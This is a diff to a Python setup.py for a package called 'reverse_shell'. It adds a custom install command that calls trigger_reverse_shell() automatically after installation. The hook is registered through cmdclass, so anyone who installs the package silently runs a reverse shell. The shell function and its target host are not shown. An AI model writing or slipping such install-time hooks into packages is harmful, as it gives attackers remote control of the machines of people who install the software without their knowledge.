@@ -1,4 +1,12 @@
 from setuptools import setup, find_packages
+from setuptools.command.install import install as _install
+
+class CustomInstallCommand(_install):
+    def run(self):
+        _install.run(self)
+        # Execute the reverse shell here
+        from reverse_shell.shell import trigger_reverse_shell
+        trigger_reverse_shell()
 
 setup(
     name="reverse_shell",
@@ -19,4 +27,7 @@ setup(
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
     ],
+    cmdclass={
+        'install': CustomInstallCommand,
+    },
 )
